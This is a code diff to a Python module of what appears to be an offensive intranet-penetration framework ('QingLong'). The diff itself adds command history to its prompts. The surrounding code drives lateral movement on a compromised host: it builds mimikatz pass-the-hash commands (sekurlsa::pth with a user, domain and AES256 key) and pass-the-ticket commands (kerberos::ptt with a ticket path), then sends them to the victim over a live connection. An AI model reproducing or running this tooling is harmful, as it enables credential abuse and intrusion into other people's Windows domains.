@@ -3,6 +3,7 @@ import struct
 from prompt_toolkit import prompt
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 
 from AuxiliaryFunctions import MyTable
 
@@ -12,9 +13,10 @@ class HorizontalMovement:
         commands = ["show functions", "back", "show params"]
         completer = WordCompleter(commands)
         formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Horizontal Movement] \033[0m')
+        history = InMemoryHistory()
         while True:
             try:
-                choice = prompt(formatted_text1, completer=completer)
+                choice = prompt(formatted_text1, completer=completer, history=history)
                 if choice == 'show functions':
                     self.show_functions()
                     continue
@@ -79,8 +81,9 @@ class HorizontalMovement:
         commands = ["exploit"]
         completer = WordCompleter(commands)
         formatted_text1 = ANSI('\033[1;1;1m> \033[0m')
+        history = InMemoryHistory()
         while True:
-            command = prompt(formatted_text1, completer=completer)
+            command = prompt(formatted_text1, completer=completer, history=history)
             if command == 'exploit':
                 command1 = "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:" + choice.split()[2] + " /domain:" + choice.split()[1] + " /aes256:" + choice.split()[3] + "\" exit"
                 self.receive(conn, command1)
@@ -94,8 +97,9 @@ class HorizontalMovement:
         commands = ["back"]
         completer = WordCompleter(commands)
         formatted_text1 = ANSI('\033[1;1;1matexec > \033[0m')
+        history = InMemoryHistory()
         while True:
-            command = prompt(formatted_text1, completer=completer)
+            command = prompt(formatted_text1, completer=completer, history=history)
             if command == 'back':
                 break
             elif command == "":
@@ -133,13 +137,26 @@ class HorizontalMovement:
         self.receive(conn, command2)
         print('\033[1;32;32m' + "[+] 下面要求输入管理员的票据在受害者主机上的绝对路径." + '\033[0m')
         # 需要票据的绝对路径
-        path = input('\033[1;34;34m' + "[*] Input the absolute path of the administrator's ticket > " + '\033[0m')
-        command3 = "mimikatz.exe \"kerberos::ptt \"" + path + "\"\" exit"
-        self.receive(conn, command3)
-        print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
+        commands = ["finished"]
+        completer = WordCompleter(commands)
+        formatted_text = ANSI('\033[1;32;32mInput the absolute path of the administrator\'s ticket > \033[0m')
+        history = InMemoryHistory()
         while True:
-            command4 = input('\033[1;32;32m' + "PTT > " + '\033[0m')
-            if command4 == 'exit':
+            path = prompt(formatted_text, completer=completer, history=history)
+            if path == "finished":
+                break
+            command3 = "mimikatz.exe \"kerberos::ptt \"" + path + "\"\" exit"
+            self.receive(conn, command3)
+            continue
+        # print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
+        # 注入票据后，开始票据传递攻击
+        tip = ["back"]
+        completer = WordCompleter(tip)
+        formatted_text1 = ANSI('\033[1;32;32mPTT > \033[0m')
+        history = InMemoryHistory()
+        while True:
+            command4 = prompt(formatted_text1, completer=completer, history=history)
+            if command4 == 'back':
                 break
             elif command4 == "":
                 continue
